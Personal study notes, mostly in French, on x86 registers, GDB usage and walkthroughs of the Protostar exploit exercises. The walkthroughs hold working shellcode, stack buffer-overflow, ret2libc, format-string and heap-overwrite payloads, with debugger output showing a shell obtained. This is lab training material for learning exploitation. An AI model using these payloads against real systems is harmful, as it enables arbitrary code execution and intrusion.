# Note ASM86

* [EIP](http://www.c-jump.com/CIS77/ASM/Instructions/I77_0040_instruction_pointer.htm): Instruction Pointer Register 
* [ESP](http://www.c-jump.com/CIS77/ASM/Stack/S77_0040_esp_register.htm): The ESP register serves as an indirect memory operand pointing to the top of the stack at any time.
* EBP: ebp is/was for a stack frame so that when you entered a function ebp could get a copy of esp at that point, everything on the stack before that happens, return address, passed in parameters, etc and things that are global for that function (local variables) will now be a static distance away from the stack frame pointer for the duration of the function. esp is now free to wander about as the compiler desires and can be used when nesting to other functions (each needs to preserve the ebp naturally). 
* [EAX](https://fr.wikibooks.org/wiki/Programmation_Assembleur/x86/Registres): Utilisé pour les opérations arithmétiques et le stockage de la valeur de retour des appels systèmes.

# Memo GDB

Commands:

* [https://cs.brown.edu/courses/cs033/docs/guides/gdb.pdf](https://cs.brown.edu/courses/cs033/docs/guides/gdb.pdf)

Outils:

* [Peda](https://github.com/longld/peda)



Lancer `gdb`:

	gdb <program>

Set a breakpoint at the start of `main`:

	b[reak] main

List all breakpoints:

	i[nfo] b

Set a breakpoint to a given address:

	b[reak] *0x123456789

Remove a breakpoint:

	d[elete] <breakpoint number>

Run the program:

	r[un] [arg1 [arg2] ...]

Set the display:

	display/3i $eip

Unset the display:

	undisplay/3i $eip

Step into (next instruction): 

	si

> Execute one machine instruction, then stop and return to the debugger. 

Continuer l'exécution (jusqu'au prochain point d'arret):

	c[continue]

Skip a function call:

	ni

> Execute one machine instruction, but if it is a function call, proceed until the function returns. 

Get out of a function:

	fin[ish]

Print a value:

	print main

	print nowinner
	$4 = {void (void)} 0x8048478 <nowinner>

Afficher le contenu d'une zone mémoire (ici de 1000 * 4 octets):

		x/1000x <@ de début de la zone>

# Utilisation de la pile

### Description rapide

Code C:

	printf("data is at %p, fp is at %p\n", d, f);

Assembleur:

	0x080484c0 <main+52>:	mov    eax,0x80485f7
	0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
	0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
	0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
	0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
	0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
	0x080484d8 <main+76>:	call   0x8048378 <printf@plt>

Donc, à l'instant de l'exécution de `printf`, la pile est:

	esp:     "data is at %p, fp is at %p\n"
	esp+0x4: d
	esp+0x8: f

### Vérification

A l'exécution, on a:

	user@protostar:/opt/protostar/bin$ ./heap0 toto
	data is at 0x804a008, fp is at 0x804a050
	level has not been passed

Donc:

* @param1 (`"data is at %p, fp is at %p\n"`)
* @param2 (`d`): `0x804a008`
* @param3 (`f`): `0x804a050`

Il faut savoir que:

	MOV opérandecible,opérandesource

On voit que:

	(gdb) x/s 0x80485f7
	0x80485f7:	 "data is at %p, fp is at %p\n"

Donc, à l'instant de l'exécution de `printf`, la pile est:

	esp:     "data is at %p, fp is at %p\n"
	esp+0x4: d
	esp+0x8: f

Pour voir le contenu de la pile au moment de l'exécution de la fonction `printf`, il faut placer un point d'arret à l'adresse qui précède l'appel à la fonction:

	(gdb) b *0x080484d5
	Breakpoint 1 at 0x80484d5: file heap0/heap0.c, line 34.
	(gdb) r AAAA
	...
	(gdb) si
	0x080484d8	34	in heap0/heap0.c
	(gdb) x/x $esp
	0xbffff770:	0x080485f7

`0x080485f7` est bien l'adresse du premier paramètre de la fonction `printf`.

	(gdb) x/x $esp + 0x4
	0xbffff774:	0x0804a008
	(gdb) x/x $esp + 0x8
	0xbffff778:	0x0804a050

On a bien:

* `$esp = "data is at %p, fp is at %p\n"`
* `$esp + 0x4 = d`
* `$esp + 0x8 = f`

# Stack5

## Présentation

[https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/](https://web.archive.org/web/20170419023355/https://exploit-exercises.com/protostar/stack5/)

	0x080483c4 <main+0>:	push   ebp
	0x080483c5 <main+1>:	mov    ebp,esp
	0x080483c7 <main+3>:	and    esp,0xfffffff0
	0x080483ca <main+6>:	sub    esp,0x50
	0x080483cd <main+9>:	lea    eax,[esp+0x10]
	0x080483d1 <main+13>:	mov    DWORD PTR [esp],eax
	0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
	0x080483d9 <main+21>:	leave  
	0x080483da <main+22>:	ret  

## Représentation

![](stack1.png)

![](stack2.png)

![](stack3.png)

![](stack4.png)

![](stack5.png)

![](stack6.png)

> Veuillez noter que `0x40 = 64` et `char buffer[64]`. On réserve 64 octets.

## Exploitation

Sur [ce site](http://shell-storm.org/shellcode/files/shellcode-827.php)
, on trouve un exploit:

	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

Il faut:
* injecter le code de l'exploit dans le processus.
* modifier la case mémoire qui contient l'adresse de retour de la fonction `main()`. Il faut y injecter l'adresse du code qui contient l'exploit.

La case mémoire qui contient l'adresse de retour de la fonction `main()` se situe à `x + 0x44` octets de la variable `buffer`.

Pour injecter le code de l'exploit dans le processus, nous passons par l'intermédiaire d'une variable d'environnement.

Pour créer la variable d'environnement:

	python -c 'print "\x90" * (0x44+x) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > file
	ls -l file
	export MA_VARIABLE=$(cat file)

Avec `x` = 4, 8 ou 12.

Si `x=4`:

	python -c 'print "\x90" * (0x44 + 0x4) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > file

> * Il faut relancer le programme après création/modification de la variable d'environnement.
> * "\x90" est le code de l'instruction `NOP`.

Pour connaître l'adresse du code qui contient l'exploit:

	x/1000s $esp

> **Attention !!!** cette commande va affiche l'addresse de début de la chaîne "`MA_VARIABLE=...`".
> Il faut ajouter `strlen("MA_VARIABLE=")` à l'adresse afficher pour obtenir l'adresse de début du code à exécuter.


# Stack6

## Présentation

[https://web.archive.org/web/20140405142902/http://www.exploit-exercises.com/protostar/stack6](https://web.archive.org/web/20140405142902/http://www.exploit-exercises.com/protostar/stack6)

	(gdb) disassemble main
	Dump of assembler code for function main:
	0x080484fa <main+0>:	push   ebp
	0x080484fb <main+1>:	mov    ebp,esp
	0x080484fd <main+3>:	and    esp,0xfffffff0
	0x08048500 <main+6>:	call   0x8048484 <getpath>
	0x08048505 <main+11>:	mov    esp,ebp
	0x08048507 <main+13>:	pop    ebp
	0x08048508 <main+14>:	ret    
	End of assembler dump.


	(gdb) disassemble getpath
	Dump of assembler code for function getpath:
	0x08048484 <getpath+0>:	push   ebp
	0x08048485 <getpath+1>:	mov    ebp,esp
	0x08048487 <getpath+3>:	sub    esp,0x68
	0x0804848a <getpath+6>:	mov    eax,0x80485d0
	0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
	0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
	0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
	0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
	0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
	0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
	0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
	0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
	0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
	0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
	0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
	0x080484b8 <getpath+52>:	and    eax,0xbf000000
	0x080484bd <getpath+57>:	cmp    eax,0xbf000000
	0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
	0x080484c4 <getpath+64>:	mov    eax,0x80485e4
	0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
	0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
	0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
	0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
	0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
	0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
	0x080484e4 <getpath+96>:	mov    eax,0x80485f0
	0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
	0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
	0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
	0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
	0x080484f8 <getpath+116>:	leave  
	0x080484f9 <getpath+117>:	ret    
	End of assembler dump.

Objectif: exécuter `system("/bin/sh")`.

## Exploitation

* On place `"/bin/sh`" dans une variable d'environnement. On récupère l'adresse de la chaîne de caractères.
* On remplace l'adresse de retour de `getpath()` par l'adresse de `system()`.
* On place dans la pile l'adresse de la chaîne `"/bin/sh`" de façon à ce que `system()` l'utilise.

### Technique 1

Obtenir l'adresse de `system()`:

	b main
	r
	print system

Résultat:

	(gdb) print system
	$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

Il faut ajouter des "` `" (espaces) avant la chaîne de caractères.

	export MA_VARIABLE_ENV=$(python -c 'print " " * 0x1000 + "/bin/sh"')
	echo "$MA_VARIABLE_ENV"

Puis:

	(gdb) x/1000s $esp

	0xbfffe955:	 "/opt/protostar/bin/stack6"
	0xbfffe96f:	 "MA_VARIABLE_ENV=", ' ' <repeats 184 times>...
	0xbfffea37:	 ' ' <repeats 200 times>...
	0xbfffeaff:	 ' ' <repeats 200 times>...
	0xbfffebc7:	 ' ' <repeats 200 times>...
	0xbfffec8f:	 ' ' <repeats 200 times>...
	0xbfffed57:	 ' ' <repeats 200 times>...
	0xbfffee1f:	 ' ' <repeats 200 times>...
	0xbfffeee7:	 ' ' <repeats 200 times>...
	0xbfffefaf:	 ' ' <repeats 200 times>...
	0xbffff077:	 ' ' <repeats 200 times>...
	0xbffff13f:	 ' ' <repeats 200 times>...
	0xbffff207:	 ' ' <repeats 200 times>...
	0xbffff2cf:	 ' ' <repeats 200 times>...
	0xbffff397:	 ' ' <repeats 200 times>...
	0xbffff45f:	 ' ' <repeats 200 times>...
	0xbffff527:	 ' ' <repeats 200 times>...
	0xbffff5ef:	 ' ' <repeats 200 times>...
	0xbffff6b7:	 ' ' <repeats 200 times>...
	0xbffff77f:	 ' ' <repeats 200 times>...
	0xbffff847:	 ' ' <repeats 200 times>...
	0xbffff90f:	 ' ' <repeats 112 times>, "/bin/sh"

Donc l'adresse de la chaîne `"/bin/sh`" est `0xbffff96f + 16`.

	(gdb) print/x 0xbffff96f + 2048
	$3 = 0xbffff97f

> * il faut lancer l'exécution de la function `main` avant.
> * `0x1000 = 4096`. On "tape" au milieu de la chaîne (à 2048).

Calcul de la distance entre `buffer` et l'adresse de retour de la fonction `getpath()`:

	0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
	0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
	0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>

Donc, entre `buffer` et l'adresse de retour de la fonction `getpath()`, il y a `0x4c + 0x04 = 0x50`, soit (80 octets).

Remplacement de l'adresse de retour de `getpath()` par l'adresse de `system()` (`0xb7ecffb0`):

	python -c 'print "A" * 80 + "\xB0\xFF\xEC\xB7" + "BBBB" + "\x7F\xF9\xFF\xBF"' > /tmp/file && ls -l /tmp/file
	stack6 < /tmp/file

> "BBBB": adresse de retour de `system`.

On lance l'exécution du programme:

	(cat /tmp/file; cat) | ./stack6 

### Technique 2

Dans `gdb`, pour trouver l'adresse de chargement de la librairie:

	info proc map

Télécharger [rt](https://github.com/0vercl0k/rp/downloads).

	(gdb) info proc map
	process 2764
	cmdline = '/opt/protostar/bin/stack6'
	cwd = '/opt/protostar/bin'
	exe = '/opt/protostar/bin/stack6'
	Mapped address spaces:

		Start Addr   End Addr       Size     Offset objfile
		 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
		 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
		0xb7e96000 0xb7e97000     0x1000          0        
		0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
		0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
		0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
		0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
		0xb7fd9000 0xb7fdc000     0x3000          0        
		0xb7fe0000 0xb7fe2000     0x2000          0        
		0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
		0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
		0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
		0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
		0xbffea000 0xc0000000    0x16000          0           [stack]

Du coup:

	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --search-hexa="/bin/sh" --file /lib/libc-2.11.2.so
	Trying to open '/lib/libc-2.11.2.so'..
	Loading ELF information..
	FileFormat: Elf, Arch: Ia32
	0x0011f3bf: /bin/sh

Donc, on connaît l'adresse de la chaîne "`/bin/sh`" relativement au debut de la `libc`: `0x0011f3bf`.
Il faut ajouter l'adresse de chargement de la librairie.

	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so

Donc:

	(gdb) print/x 0x0011f3bf + 0xb7e97000
	$1 = 0xb7fb63bf

D'où:

	user@protostar:/opt/protostar/bin$ (cat /tmp/file; cat) | ./stack6
	input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA���BBBB�c��
	ls /
	bin   dev  home        lib   lost+found  mnt  proc  selinux  sys  usr  vmlinuz
	boot  etc  initrd.img  live  media	 opt  sbin  srv      tmp  var


# Stack7

## Présentation

[](https://web.archive.org/web/20140405141221/http://exploit-exercises.com/protostar/stack7)

## Exploitation

	(gdb) disassemble main
	Dump of assembler code for function main:
	0x08048545 <main+0>:	push   ebp
	0x08048546 <main+1>:	mov    ebp,esp
	0x08048548 <main+3>:	and    esp,0xfffffff0
	0x0804854b <main+6>:	call   0x80484c4 <getpath>
	0x08048550 <main+11>:	mov    esp,ebp
	0x08048552 <main+13>:	pop    ebp
	0x08048553 <main+14>:	ret    
	End of assembler dump.
	(gdb) disassemble getpath
	Dump of assembler code for function getpath:
	0x080484c4 <getpath+0>:	push   ebp
	0x080484c5 <getpath+1>:	mov    ebp,esp
	0x080484c7 <getpath+3>:	sub    esp,0x68
	0x080484ca <getpath+6>:	mov    eax,0x8048620
	0x080484cf <getpath+11>:	mov    DWORD PTR [esp],eax
	0x080484d2 <getpath+14>:	call   0x80483e4 <printf@plt>
	0x080484d7 <getpath+19>:	mov    eax,ds:0x8049780
	0x080484dc <getpath+24>:	mov    DWORD PTR [esp],eax
	0x080484df <getpath+27>:	call   0x80483d4 <fflush@plt>
	0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]
	0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax
	0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>
	0x080484ef <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
	0x080484f2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
	0x080484f5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
	0x080484f8 <getpath+52>:	and    eax,0xb0000000
	0x080484fd <getpath+57>:	cmp    eax,0xb0000000
	0x08048502 <getpath+62>:	jne    0x8048524 <getpath+96>
	0x08048504 <getpath+64>:	mov    eax,0x8048634
	0x08048509 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
	0x0804850c <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
	0x08048510 <getpath+76>:	mov    DWORD PTR [esp],eax
	0x08048513 <getpath+79>:	call   0x80483e4 <printf@plt>
	0x08048518 <getpath+84>:	mov    DWORD PTR [esp],0x1
	0x0804851f <getpath+91>:	call   0x80483c4 <_exit@plt>
	0x08048524 <getpath+96>:	mov    eax,0x8048640
	0x08048529 <getpath+101>:	lea    edx,[ebp-0x4c]
	0x0804852c <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
	0x08048530 <getpath+108>:	mov    DWORD PTR [esp],eax
	0x08048533 <getpath+111>:	call   0x80483e4 <printf@plt>
	0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]
	0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
	0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>
	0x08048543 <getpath+127>:	leave  
	0x08048544 <getpath+128>:	ret    
	End of assembler dump.

Il faut utiliser `rp-lin-x86`. Par exemple:

	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --search-hexa="/bin/sh" --file /lib/libc-2.11.2.so
	Trying to open '/lib/libc-2.11.2.so'..
	Loading ELF information..
	FileFormat: Elf, Arch: Ia32
	0x0011f3bf: /bin/sh

Le commande `strdup(buffer)` retourne une valeur **stockée dans [EAX](https://fr.wikibooks.org/wiki/Programmation_Assembleur/x86/Registres)**.
Conséquence: nous avons un moyen d'injecter du code arbitraire dans le processus.

On place un breakpoint à la fin de la fonction `getpath()`:

	b *0x08048544
	r

On trouve l'adresse de retour de `getpath()`.

On cherche un `call eax` dans le programme `stack7`:

	user@protostar:/opt/protostar/bin$ ./rp-lin-x86 --file stack7 -r 2 | egrep ':[^,]+call'
	0x08048478: call dword [0x0804965C+eax*4] ;  (1 found)
	0x080485b4: call dword [ebx+esi*4-0x000000E8] ;  (1 found)
	0x080484bf: call eax ;  (1 found)
	0x080485eb: call eax ;  (1 found)

Donc, nous avons:

* l'adresse d'une instruction `call eax` (ex: `0x080485eb`).
* un moyen d'injecter une adresse dans EAX via `strdup()` (retour de la fonction stockée dans `EAX`).

Nombre d'octets pour écraser l'adresse de retour: 0x50.

Sur [ce site](http://shell-storm.org/shellcode/files/shellcode-811.php)
, on trouve un exploit:

	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

On forge une suite d'octets arbitaire:

	python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (0x50 - 28) + "\xBF\x84\x04\x08"' > /tmp/file && ls -l /tmp/file

> * `(0x50 - 28)` car il faut injecter 0x50 carcatères. Et le code du [shell](http://shell-storm.org/shellcode/files/shellcode-811.php) fait 28 octets.
> * On fait une pierre deux coups. L'appel à `call EAX` est injecté via écrasement causé par un débordement de buffer `buffer` (`0x50` caractères).

# Format0

## Présentation

[https://web.archive.org/web/20140405141145/http://exploit-exercises.com/protostar/format0](https://web.archive.org/web/20140405141145/http://exploit-exercises.com/protostar/format0)

## Exploitation

	(gdb) disassemble vuln
	Dump of assembler code for function vuln:
	0x080483f4 <vuln+0>:	push   ebp
	0x080483f5 <vuln+1>:	mov    ebp,esp
	0x080483f7 <vuln+3>:	sub    esp,0x68
	0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
	0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
	0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
	0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
	0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
	0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
	0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
	0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
	0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
	0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
	0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
	0x08048429 <vuln+53>:	leave  
	0x0804842a <vuln+54>:	ret    
	End of assembler dump.
	(gdb) disassemble main
	Dump of assembler code for function main:
	0x0804842b <main+0>:	push   ebp
	0x0804842c <main+1>:	mov    ebp,esp
	0x0804842e <main+3>:	and    esp,0xfffffff0
	0x08048431 <main+6>:	sub    esp,0x10
	0x08048434 <main+9>:	mov    eax,DWORD PTR [ebp+0xc]
	0x08048437 <main+12>:	add    eax,0x4
	0x0804843a <main+15>:	mov    eax,DWORD PTR [eax]
	0x0804843c <main+17>:	mov    DWORD PTR [esp],eax
	0x0804843f <main+20>:	call   0x80483f4 <vuln>
	0x08048444 <main+25>:	leave  
	0x08048445 <main+26>:	ret    
	End of assembler dump.

Détermination de l'adresse relative de `buffer`:

	0x080483f4 <vuln+0>:	push   ebp
	0x080483f5 <vuln+1>:	mov    ebp,esp
	0x080483f7 <vuln+3>:	sub    esp,0x68
	0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0
	0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
	0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
	0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]
	0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax
	0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>

Réponse:

	python -c 'print "0x64" + "\x0d\xad\xbe\xef"'

# format1

## Présentation

[Lien](https://web.archive.org/web/20140405143000/http://exploit-exercises.com/protostar/format1)

## Exploitation

Si:

	int i;
	printf("toto%n", &i);
	// i vaut 4

	printf("toto%2$n", &i, &j);
	// j vaut 4

Pile:

	@retour de printf
	format string
	1er arg de la format string
	2em arg de la format string
	...

Code:

	(gdb) disassemble vuln
	Dump of assembler code for function vuln:
	0x080483f4 <vuln+0>:	push   ebp
	0x080483f5 <vuln+1>:	mov    ebp,esp
	0x080483f7 <vuln+3>:	sub    esp,0x18
	0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
	0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
	0x08048405 <vuln+17>:	mov    eax,ds:0x8049638
	0x0804840a <vuln+22>:	test   eax,eax
	0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
	0x0804840e <vuln+26>:	mov    DWORD PTR [esp],0x8048500
	0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
	0x0804841a <vuln+38>:	leave  
	0x0804841b <vuln+39>:	ret    
	End of assembler dump.

Adresse de `string`:

	0x080483fa <vuln+6>:	mov    eax,DWORD PTR [ebp+0x8]
	0x080483fd <vuln+9>:	mov    DWORD PTR [esp],eax
	0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>

=> `ebp + 0x8`

Adresse de `target`:

	(gdb) print &target
	$2 = (int *) 0x8049638

> Il faut lancer le programme (`r`) avant.

Pour trouver:

	for i in `seq 500` ;
	do
	   ./format1 TOTO%$i\$08x`python -c "print '\x38\x96\x04\x08A'*4"` ;
	   echo ' <-> ' $i ; 
	done | grep 8049638

Ceci donne:

	user@protostar:/opt/protostar/bin$ for i in `seq 500` ;
	> do
	>    ./format1 TOTO%$i\$08x`python -c "print '\x38\x96\x04\x08A'*4"` ;
	>    echo ' <-> ' $i ; 
	> done | grep 8049638
	TOTO080496388A8A8A8A <->  135


# format3

[Lien](https://web.archive.org/web/20140405143126/http://exploit-exercises.com/protostar/format3)

	(gdb) print &target
	$1 = (int *) 0x80496f4

	(gdb) break printf
	Breakpoint 1 at 0x804837c

Start:

	(gdb) r
	Starting program: /opt/protostar/bin/format3 
	AAAA

	Breakpoint 1, __printf (format=0xbfffe570 "AAAA\n") at printf.c:29
	29	printf.c: No such file or directory.
		in printf.c

Get the address of the argument passed to the function!

	(gdb) info frame
	Stack level 0, frame at 0xbfffe540:
	 eip = 0xb7eddfa2 in __printf (printf.c:29); saved eip 0x8048465
	 called by frame at 0xbfffe560
	 source language c.
	 Arglist at 0xbfffe538, args: format=0xbfffe570 "AAAA\n"
	 Locals at 0xbfffe538, Previous frame's sp is 0xbfffe540
	 Saved registers:
	  ebx at 0xbfffe534, ebp at 0xbfffe538, eip at 0xbfffe53c

=> l'adresse du premier (et seul) argument est `0xbfffe570`.

On affiche la stack:

	(gdb) x/3xw  0xbfffe538
	0xbfffe538:	0xbfffe558	0x08048465	0xbfffe570
	(gdb) x/x 0x08048465
	0x8048465 <printbuffer+17>:	0x8955c3c9
	(gdb) x/x 0xbfffe558
	0xbfffe558:	0xbfffe778
	(gdb) x/x 0xbfffe570
	0xbfffe570:	0x41414141

On reconnait "AAAA" => `0x41414141`

=> donc l'adresse à modifier est `0xbfffe570`.

# Format 4

[Lien](https://web.archive.org/web/20140405142914/http://exploit-exercises.com/protostar/format4)

On suit l'aide:

	user@protostar:/opt/protostar/bin$ objdump -TR format4

	format4:     file format elf32-i386

	DYNAMIC SYMBOL TABLE:
	00000000  w   D  *UND*	00000000              __gmon_start__
	00000000      DF *UND*	00000000  GLIBC_2.0   fgets
	00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
	00000000      DF *UND*	00000000  GLIBC_2.0   _exit
	00000000      DF *UND*	00000000  GLIBC_2.0   printf
	00000000      DF *UND*	00000000  GLIBC_2.0   puts
	00000000      DF *UND*	00000000  GLIBC_2.0   exit
	080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
	08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


	DYNAMIC RELOCATION RECORDS
	OFFSET   TYPE              VALUE 
	080496fc R_386_GLOB_DAT    __gmon_start__
	08049730 R_386_COPY        stdin
	0804970c R_386_JUMP_SLOT   __gmon_start__
	08049710 R_386_JUMP_SLOT   fgets
	08049714 R_386_JUMP_SLOT   __libc_start_main
	08049718 R_386_JUMP_SLOT   _exit
	0804971c R_386_JUMP_SLOT   printf
	08049720 R_386_JUMP_SLOT   puts
	08049724 R_386_JUMP_SLOT   exit

Voir une correction sur un lien intéressant... (section "Good links").

# Heap 0

* [Lien](http://exploit-exercises.com/protostar/heap0)
* [Explication](https://www.ayrx.me/protostar-walkthrough-heap)

On exécute le programme avec un argument: "`AAAA`".

	run AAAA

Utiliser `info proc map[pings]` pour voir où le "heap" commence et termine => `0x804a000` => `0x806b000`.

On cherche la valeur spécifiée en premier paramètre du programme au moment de son exécution (`argv[1]`).

	x/100s 0x804a000
	...
	0x804a006:	 ""
	0x804a007:	 ""
	0x804a008:	 "AAAA"
	0x804a00d:	 ""
	0x804a00e:	 ""

Résultat: on constate que le paramètre "`AAAA`" est stocké dans le "heap" à l'adresse `0x804a008`.

Concentrons nous sur la ligne suivante:

	f->fp = nowinner;

`f` est retourné par `malloc`. Donc `f` est stocké dans le "heap".
Et donc, `f->fp` se trouve dans le "heap". Par conséquent, l'adresse de `nowinner` est
stockée dans le "heap" (à l'adresse de `f->fp`).

	print nowinner
	$4 = {void (void)} 0x8048478 <nowinner>

Conclusion: `f->fp = 0x8048478`

La technique consiste à écraser la valeur pointée par `f->fp` (l'adresse de `nowinner`) par l'adresse de `winner`.

	0x080484c0 <main+52>:	mov    eax,0x80485f7
	0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
	0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
	0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
	0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
	0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
	0x080484d8 <main+76>:	call   0x8048378 <printf@plt>

Et:

	(gdb) x/s 0x80485f7
	0x80485f7:	 "data is at %p, fp is at %p\n"

Au moment de l'exécution de `printf`, la structure de la pile est:

	esp:     "data is at %p, fp is at %p\n" [=> 0x80485f7]
	esp+0x4: d                              [=> 0x804a008]
	esp+0x8: f                              [=> 0x804a050]

> CF section "Utilisation de la pile".

Donc:
* l'adresse de `d`, dans le "heap" est `0x804a008`.
* l'adresse de `f`, dans le "heap" est `0x804a050`.

Donc, il faut écrire plus de 72 caractères:

	(gdb) print/x 0x804a050 - 0x804a008
	$1 = 0x48
	(gdb) print/d 0x804a050 - 0x804a008
	$2 = 72

Adresse de `winner`:

	(gdb) print winner
	$5 = {void (void)} 0x8048464 <winner>

Test:

	python -c 'print("A" * 72 + "\x64\x84\x04\x08")' | ./heap0
	r `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`

Du coup:

	(gdb) b *0x080484fb
	Breakpoint 1 at 0x80484fb: file heap0/heap0.c, line 38.
	(gdb) r `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
	Starting program: /opt/protostar/bin/heap0 `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
	data is at 0x804a008, fp is at 0x804a050

	Breakpoint 1, 0x080484fb in main (argc=2, argv=0xbffff804) at heap0/heap0.c:38
	38	heap0/heap0.c: No such file or directory.
		in heap0/heap0.c
	(gdb) si
	0x080484fd	38	in heap0/heap0.c
	(gdb) x/x $eax
	<winner>:	0x83e58955

Du coup:

	user@protostar:/opt/protostar/bin$  ./heap0 `python -c 'print("A" * 72 + "\x64\x84\x04\x08")'`
	data is at 0x804a008, fp is at 0x804a050
	level passed

# Heap 1

Technique: il faut écraser l'adresse de `puts` pour la remplacer par celle de `winner`.

	(gdb) print winner
	$1 = {void (void)} 0x8048494 <winner>

	(gdb) print puts
